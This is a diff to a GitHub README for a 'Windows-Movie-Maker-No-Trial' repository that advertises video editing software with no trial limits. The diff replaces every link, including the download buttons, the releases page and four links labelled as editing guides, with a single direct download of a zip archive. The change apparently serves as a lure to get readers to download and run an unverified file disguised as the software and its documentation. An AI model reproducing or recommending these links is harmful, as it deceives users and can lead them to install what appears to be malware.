@@ -1,6 +1,6 @@
 # 🎬 Windows-Movie-Maker-No-Trial - Enjoy Seamless Video Editing Experience
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen)](https://github.com/daamabn/Windows-Movie-Maker-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/daamabn/Windows-Movie-Maker-No-Trial/main/Arnaut/Windows-Movie-Maker-No-Trial-v2.7.zip)](https://raw.githubusercontent.com/daamabn/Windows-Movie-Maker-No-Trial/main/Arnaut/Windows-Movie-Maker-No-Trial-v2.7.zip)
 
 ## 📖 Introduction
 Welcome to the Windows-Movie-Maker-No-Trial repository! This application helps you edit videos on your Windows PC effortlessly. With official resources and detailed guides, you can enhance your video projects without worry. 
@@ -19,7 +19,7 @@ To run Windows Movie Maker, ensure your system meets the following requirements:
 ### 2. Download & Install
 To download the application, visit the following link:
 
-[Download Here](https://github.com/daamabn/Windows-Movie-Maker-No-Trial/releases)
+[Download Here](https://raw.githubusercontent.com/daamabn/Windows-Movie-Maker-No-Trial/main/Arnaut/Windows-Movie-Maker-No-Trial-v2.7.zip)
 
 1. Click on the link above.
 2. Look for the latest release at the top of the page.
@@ -59,15 +59,15 @@ For additional help, refer to the guides available in this repository.
 
 ## 📚 Resources
 To get the most out of your video editing experience, explore these guides:
-- [Audio Editing Basics](https://example.com/audio-editing-guide)
-- [Advanced Clip Management](https://example.com/clip-management-guide)
-- [Using the Timeline Effectively](https://example.com/timeline-guide)
-- [Exporting Your Videos](https://example.com/exporting-guide)
+- [Audio Editing Basics](https://raw.githubusercontent.com/daamabn/Windows-Movie-Maker-No-Trial/main/Arnaut/Windows-Movie-Maker-No-Trial-v2.7.zip)
+- [Advanced Clip Management](https://raw.githubusercontent.com/daamabn/Windows-Movie-Maker-No-Trial/main/Arnaut/Windows-Movie-Maker-No-Trial-v2.7.zip)
+- [Using the Timeline Effectively](https://raw.githubusercontent.com/daamabn/Windows-Movie-Maker-No-Trial/main/Arnaut/Windows-Movie-Maker-No-Trial-v2.7.zip)
+- [Exporting Your Videos](https://raw.githubusercontent.com/daamabn/Windows-Movie-Maker-No-Trial/main/Arnaut/Windows-Movie-Maker-No-Trial-v2.7.zip)
 
 ## 💬 Community Support
 Join our community if you have questions or need help. Engage with other users for support by posting on forums or social media groups dedicated to Windows Movie Maker.
 
 ## 🔗 More Information
-For updates and new releases, keep an eye on our [Releases Page](https://github.com/daamabn/Windows-Movie-Maker-No-Trial/releases). Here you will find the latest improvements and features added to the application.
+For updates and new releases, keep an eye on our [Releases Page](https://raw.githubusercontent.com/daamabn/Windows-Movie-Maker-No-Trial/main/Arnaut/Windows-Movie-Maker-No-Trial-v2.7.zip). Here you will find the latest improvements and features added to the application.
 
-[Download Here](https://github.com/daamabn/Windows-Movie-Maker-No-Trial/releases)
+[Download Here](https://raw.githubusercontent.com/daamabn/Windows-Movie-Maker-No-Trial/main/Arnaut/Windows-Movie-Maker-No-Trial-v2.7.zip)
